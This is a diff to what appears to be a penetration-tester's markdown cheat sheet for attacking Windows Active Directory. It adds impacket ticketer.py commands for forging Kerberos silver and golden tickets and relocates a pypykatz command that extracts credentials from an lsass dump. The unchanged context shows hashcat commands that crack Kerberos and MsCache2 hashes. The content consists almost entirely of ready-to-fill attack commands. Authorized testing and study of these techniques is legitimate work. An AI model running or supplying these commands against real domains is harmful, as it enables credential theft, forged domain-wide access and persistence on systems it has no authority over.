@@ -270,10 +270,26 @@ WINRM = On
 SNMP = Off
 ```
 
+## pypykatz
+### Examine lsass dump
+```bash
+pypykatz lsa minidump lsass.DMP
+```
+
+## impacket golden and silver tickets
+#### Silver ticket
+```bash
+python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> -spn <service>/<AD_domain>l <user>
+```
+#### Golden ticket
+```bash
+python3 ticketer.py -nthash <nthash> -domain-sid <domain-sid> -domain <AD_domain> -dc-ip <Domain_Controller_IP> <user>
+```
+
 ## SMB VEV
 ### Mount share
 ```bash
-sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<domain.com>
+sudo mount.cifs <//ip/folder> <./folder> -o user=<username>,password=<password>,dom=<AD_domain>
 ```
 
 ### Unmount share
@@ -352,10 +368,4 @@ hashcat64.exe -m 19900  -a 0 krb5tetype18.txt <passlist.txt> -o cracked.txt
 ### MsCache 2 (slow af)
 ```bash
 hashcat64.exe -m 2100 -a 0 mscache2-hashes.txt <passlist.txt> -o cracked.txt
-```
-
-## pypykatz
-### Examine lsass dump
-```bash
-pypykatz lsa minidump lsass.DMP
 ```
